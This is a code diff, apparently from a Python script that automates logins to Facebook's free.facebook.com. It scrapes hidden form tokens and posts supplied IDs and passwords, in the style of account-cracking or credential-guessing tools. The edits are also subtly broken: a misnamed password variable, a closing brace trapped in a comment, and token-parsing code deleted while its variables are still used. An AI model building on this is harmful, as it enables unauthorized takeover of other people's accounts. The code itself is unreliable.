@@ -1142,14 +1142,22 @@ def m5(idf,pw):
    free_fb = session.get(f'https://free.facebook.com').text
    log_data = {
     "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
-   "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
-   "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
-   "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
-   "try_number":"0",
-   "unrecognized_tries":"0",
-   "email":idf,
-   "pass":ps,
-   "login":"Log In"}
+    "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+    "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
+    "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
+    "try_number":re.search('name="try_number" value="(.*?)"', str(free_fb)).group(1),
+    "unrecognized_tries":re.search('name="unrecognized_tries" value="(.*?)"', str(free_fb)).group(1),
+    "email": idf,
+    "pass": ps,
+    "login": "Log In",
+    "login_source":re.search('name="login_source" value="(.*?)"', str(free_fb)).group(1),
+    "next":re.search('name="next" value="(.*?)"', str(free_fb)).group(1),
+    "timezone":re.search('name="timezone" value="(.*?)"', str(free_fb)).group(1),
+    "lgndim":re.search('name="lgndim" value="(.*?)"', str(free_fb)).group(1),
+    "lgnrnd":re.search('name="lgnrnd" value="(.*?)"', str(free_fb)).group(1),
+    "lgnjs":re.search('name="lgnjs" value="(.*?)"', str(free_fb)).group(1),
+    "ab_test_data": "",  # Example of an additional field that might be used for A/B testing
+    "flow": "login_no_pin"  # An example flow parameter that might be required}
    header_freefb = {'authority':'web.facebook.com',
             'method': 'POST',
             'scheme': 'https',
@@ -1211,22 +1219,7 @@ def m6(idf,pw):
     'Connection': 'keep-alive'}
    login_page_response = session.get(url, headers=headers)
    login_page_content = login_page_response.text
-   soup = BeautifulSoup(login_page_content, 'html.parser')
-   lsd = soup.find('input', {'name': 'lsd'})['value']
-   jazoest = soup.find('input', {'name': 'jazoest'})['value']
-   m_ts = soup.find('input', {'name': 'm_ts'})['value']
-   li = soup.find('input', {'name': 'li'})['value']
-   try_number = soup.find('input', {'name': 'try_number'})['value'] if soup.find('input', {'name': 'try_number'}) else '0'
-   unrecognized_tries = soup.find('input', {'name': 'unrecognized_tries'})['value'] if soup.find('input', {'name': 'unrecognized_tries'}) else '0'
-   login_source = soup.find('input', {'name': 'login_source'})['value'] if soup.find('input', {'name': 'login_source'}) else ''
-   next = soup.find('input', {'name': 'next'})['value'] if soup.find('input', {'name': 'next'}) else ''
-   timezone = soup.find('input', {'name': 'timezone'})['value'] if soup.find('input', {'name': 'timezone'}) else ''
-   lgndim = soup.find('input', {'name': 'lgndim'})['value'] if soup.find('input', {'name': 'lgndim'}) else ''
-   lgnrnd = soup.find('input', {'name': 'lgnrnd'})['value'] if soup.find('input', {'name': 'lgnrnd'}) else ''
-   lgnjs = soup.find('input', {'name': 'lgnjs'})['value'] if soup.find('input', {'name': 'lgnjs'}) else ''
-   ab_test_data = soup.find('input', {'name': 'ab_test_data'})['value'] if soup.find('input', {'name': 'ab_test_data'}) else ''
-   flow = soup.find('input', {'name': 'flow'})['value'] if soup.find('input', {'name': 'flow'}) else 'login_no_pin'
-  
+
    log_data = {
     "lsd": lsd,
     "jazoest": jazoest,
